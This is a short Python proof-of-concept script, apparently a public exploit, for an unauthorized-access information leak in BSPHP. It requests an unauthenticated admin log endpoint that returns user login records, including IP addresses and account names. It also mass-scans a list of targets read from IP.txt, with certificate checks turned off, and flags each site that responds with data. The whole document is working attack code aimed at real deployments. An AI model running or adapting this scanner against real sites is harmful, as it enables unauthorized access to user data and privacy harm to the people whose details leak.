#@author Firbasky
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息
"""

def title():
    print("BSPHP-未授权访问-信息泄露漏洞\n")

def POC_1(target_url):
    vuln_url_1 = target_url + '/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers)
        # print(response_1.text)
        if "data" in response_1.text:
            print("\033[32m[o] 目标漏洞页面为: {} \033[0m".format(vuln_url_1))
        else:
            print("\033[31m[x] 目标无漏洞 \033[0m")
            return
    except Exception as e:
        print("\033[31m[x] 目标漏洞无法利用 {} \033[0m".format(e))
        return

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for target_url in scan_url:
            if target_url[:4] != "http":
                target_url = "https://" + target_url
            target_url = target_url.strip('\n')
            try:
                POC_1(target_url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    title()
    # target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    # POC_1(target_url)
    Scan('IP.txt')
